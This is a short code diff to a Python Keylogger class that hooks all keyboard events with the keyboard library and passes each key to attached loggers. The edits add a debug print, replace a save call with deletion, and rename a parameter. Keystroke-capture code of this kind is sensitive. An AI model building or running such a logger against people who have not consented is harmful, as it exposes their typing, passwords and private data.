@@ -9,8 +9,9 @@ class Keylogger:
         keyboard.hook(callback=self._log_event)
 
     def __del__(self):
+        print ('keylogger.del')                 ######################################################
         for logger in self.loggers:
-            logger.save()
+            del logger
 
     def add_logger(self, logger: keylogger_logger._AbstractLogger):
         self.loggers.append(logger)
@@ -26,9 +27,9 @@ class Keylogger:
 
         return self
 
-    def _log(self, key: str):
+    def _log(self, text: str):
         for logger in self.loggers:
-            logger.log(key)
+            logger.log(text)
 
     def _log_event(self, event: keyboard.KeyboardEvent):
         if event.event_type == 'down':
